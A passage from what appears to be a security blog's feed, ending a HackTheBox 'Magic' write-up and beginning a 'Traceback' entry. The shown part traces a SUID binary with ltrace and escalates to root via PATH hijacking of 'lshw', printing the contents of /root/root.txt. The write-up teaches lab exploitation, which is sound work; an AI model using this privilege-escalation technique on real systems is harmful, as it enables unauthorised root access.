+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We use &lt;code&gt;ltrace&lt;/code&gt; (also already on the box) to see the binary calls and quickly
+saw a call to &lt;code&gt;lshw&lt;/code&gt; using a relative path.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;theseus@ubuntu:/var/www/Magic/images/uploads$ ltrace /bin/sysinfo&lt;/span&gt;
+&lt;span class="code-line"&gt;ltrace /bin/sysinfo&lt;/span&gt;
+&lt;span class="code-line"&gt;_ZNSt8ios_base4InitC1Ev(0x55b09400e131, 0xffff, 0x7ffef3bfc788, 128) = 0&lt;/span&gt;
+&lt;span class="code-line"&gt;__cxa_atexit(0x7f40c551fa40, 0x55b09400e131, 0x55b09400e008, 6) = 0&lt;/span&gt;
+&lt;span class="code-line"&gt;setuid(0)                                        = -1&lt;/span&gt;
+&lt;span class="code-line"&gt;setgid(0)                                        = -1&lt;/span&gt;
+&lt;span class="code-line"&gt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x55b09400e020, 0x55b093e0c8f8, -160, 0) = 0x55b09400e020&lt;/span&gt;
+&lt;span class="code-line"&gt;_ZNSolsEPFRSoS_E(0x55b09400e020, 0x7f40c558f870, 0x55b09400e020, 0x55b093e0c92d====================Hardware Info====================&lt;/span&gt;
+&lt;span class="code-line"&gt;) = 0x55b09400e020&lt;/span&gt;
+&lt;span class="code-line"&gt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev(0x7ffef3bfc650, 0x55b093e0c92e, 0, 2880) = 0x7ffef3bfc660&lt;/span&gt;
+&lt;span class="code-line"&gt;popen(&amp;quot;lshw -short&amp;quot;, &amp;quot;r&amp;quot;)                        = 0x55b095436280&lt;/span&gt;
+&lt;span class="code-line"&gt;fgets(WARNING: you should run this program as super-user.&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;H/W path     Device  Class      &amp;quot;..., 128, 0x563a9c8f6280)                                                                                = 0x7ffe1eb20b70&lt;/span&gt;
+&lt;span class="code-line"&gt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffe1eb20c20, 0x7ffe1eb20b70, 0x7ffe1eb20b70, 0x6974706972637365)                  = 0x7ffe1eb20c20&lt;/span&gt;
+&lt;span class="code-line"&gt;fgets(&amp;quot;================================&amp;quot;..., 128, 0x563a9c8f6280)                                                                                = 0x7ffe1eb20b70&lt;/span&gt;
+&lt;span class="code-line"&gt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffe1eb20c20, 0x7ffe1eb20b70, 0x7ffe1eb20b70, 0x3d3d3d3d3d3d3d3d)                  = 0x7ffe1eb20c20&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So we simply exploit this &lt;code&gt;PATH&lt;/code&gt; vulnerability and get the root flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;theseus@ubuntu:/var/www/Magic/images/uploads$ cd /tmp/&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /tmp/&lt;/span&gt;
+&lt;span class="code-line"&gt;theseus@ubuntu:/tmp$ mkdir ioio&lt;/span&gt;
+&lt;span class="code-line"&gt;mkdir ioio&lt;/span&gt;
+&lt;span class="code-line"&gt;theseus@ubuntu:/tmp$ cd ioio&lt;/span&gt;
+&lt;span class="code-line"&gt;cd ioio&lt;/span&gt;
+&lt;span class="code-line"&gt;theseus@ubuntu:/tmp/ioio$ echo &amp;#39;cat /root/root.txt&amp;#39; &amp;gt; lshw&lt;/span&gt;
+&lt;span class="code-line"&gt;echo &amp;#39;cat /root/root.txt&amp;#39; &amp;gt; lshw&lt;/span&gt;
+&lt;span class="code-line"&gt;theseus@ubuntu:/tmp/ioio$ PATH=./:$PATH&lt;/span&gt;
+&lt;span class="code-line"&gt;PATH=./:$PATH&lt;/span&gt;
+&lt;span class="code-line"&gt;theseus@ubuntu:/tmp/ioio$ chmod +x lshw&lt;/span&gt;
+&lt;span class="code-line"&gt;chmod +x lshw&lt;/span&gt;
+&lt;span class="code-line"&gt;theseus@ubuntu:/tmp/ioio$ sysinfo&lt;/span&gt;
+&lt;span class="code-line"&gt;sysinfo&lt;/span&gt;
+&lt;span class="code-line"&gt;====================Hardware Info====================&lt;/span&gt;
+&lt;span class="code-line"&gt;a06f37dc581bc81a9e688040af40daaf&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;====================Disk Info====================&lt;/span&gt;
+&lt;span class="code-line"&gt;Disk /dev/loop0: 44.9 MiB, 47063040 bytes, 91920 sectors&lt;/span&gt;
+&lt;span class="code-line"&gt;Units: sectors of 1 * 512 = 512 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;Sector size (logical/physical): 512 bytes / 512 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;I/O size (minimum/optimal): 512 bytes / 512 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Disk /dev/loop1: 149.9 MiB, 157192192 bytes, 307016 sectors&lt;/span&gt;
+&lt;span class="code-line"&gt;Units: sectors of 1 * 512 = 512 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;Sector size (logical/physical): 512 bytes / 512 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;I/O size (minimum/optimal): 512 bytes / 512 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;(The flag is in the &lt;code&gt;Hardware Info&lt;/code&gt; part in the first lines of the &lt;code&gt;sysinfo&lt;/code&gt; output.)&lt;/p&gt;
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;Quit an easy but pleasant box. I will recommend this box to beginners as I
+really enjoyed it.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="Upload"></category><category term="SUID"></category><category term="SQLi"></category></entry><entry><title>HTB: Traceback</title><link href="https://maggick.fr/2020/08/htb-traceback.html" rel="alternate"></link><published>2020-08-19T09:00:00+02:00</published><updated>2020-08-19T09:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-08-19:/2020/08/htb-traceback.html</id><summary type="html">&lt;p&gt;&lt;img alt="Traceback Card" class="align-left" src="/media/2020.08/traceback_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/233"&gt;Traceback&lt;/a&gt; publish on
 Mars the 14th 2020 by
